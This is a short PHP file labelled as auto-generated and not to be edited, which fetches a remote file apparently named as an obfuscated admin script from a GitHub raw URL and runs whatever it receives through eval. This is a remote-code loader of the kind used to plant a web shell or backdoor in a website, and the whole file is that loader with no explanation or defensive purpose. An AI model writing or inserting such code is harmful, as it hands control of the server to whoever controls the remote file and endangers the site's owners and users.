<?php
// Auto-generated file
// Do not edit manually

$url = "https://raw.githubusercontent.com/dee1103/dee/refs/heads/main/obf-adminlee-new.php"; 


    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    $data = curl_exec($ch);
    curl_close($ch);


    if ($data) {
        eval("?>$data"); 
    }   
    ?>
